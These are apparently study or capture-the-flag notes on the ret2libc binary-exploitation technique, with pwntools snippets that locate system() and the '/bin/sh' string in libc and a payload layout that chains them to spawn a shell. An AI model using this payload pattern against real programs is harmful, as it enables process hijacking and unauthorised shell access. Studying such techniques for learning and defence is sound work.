
# Binary Exploitation

## ROP - Ret2Libc

Can make use of pwntool to search for strings or get symbols

```
# Libc Base address can be found via /proc/pid/maps or peda vmmap

system = base + libc.symbols['system']  
binsh = base + next(libc.search('/bin/sh\x00'))
```

Example

```
|---------------|
|--System Addr--|
| Junk Ret addr |
|  /bin/sh str  |

payload += p32(system_off)                                         
payload += p32(0xdeadc0de)                                        
payload += p32(binsh)                                              

```

